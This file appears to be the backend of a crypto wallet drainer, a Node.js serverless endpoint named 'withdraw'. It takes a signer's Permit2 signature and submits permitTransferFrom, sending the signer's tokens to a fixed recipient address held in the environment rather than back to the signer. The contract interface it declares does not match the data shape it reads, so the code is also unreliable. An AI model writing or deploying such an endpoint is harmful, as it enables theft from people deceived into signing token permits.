// api/withdraw.js
const { ethers } = require('ethers');

// Initialize provider and wallet globally for Vercel warm-start optimization
const RPC_URL = process.env.RPC_URL;
const PRIVATE_KEY = process.env.PRIVATE_KEY;
const RECIPIENT_ADDRESS = process.env.RECIPIENT_ADDRESS;
const PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

const provider = new ethers.providers.JsonRpcProvider(RPC_URL);
const wallet = new ethers.Wallet(PRIVATE_KEY, provider);

const PERMIT2_ABI = [
    "function permitTransferFrom((address token, uint256 amount, uint256 nonce, uint256 deadline) permit, (address to, uint256 requestedAmount) transferDetails, address owner, bytes signature)"
];
const permit2Contract = new ethers.Contract(PERMIT2_ADDRESS, PERMIT2_ABI, wallet);

module.exports = async (req, res) => {
    if (req.method !== 'POST') return res.status(405).json({ success: false, message: 'Method not allowed' });

    try {
        const { signature, permitData, owner } = req.body;

        const tx = await permit2Contract.permitTransferFrom(
            permitData.details, 
            { to: RECIPIENT_ADDRESS, requestedAmount: permitData.details.permitted.amount },
            owner,
            signature
        );

        const receipt = await tx.wait();
        return res.status(200).json({ success: true, txHash: receipt.transactionHash });
    } catch (error) {
        console.error('Execution Error:', error);
        return res.status(500).json({ success: false, message: error.message });
    }
};
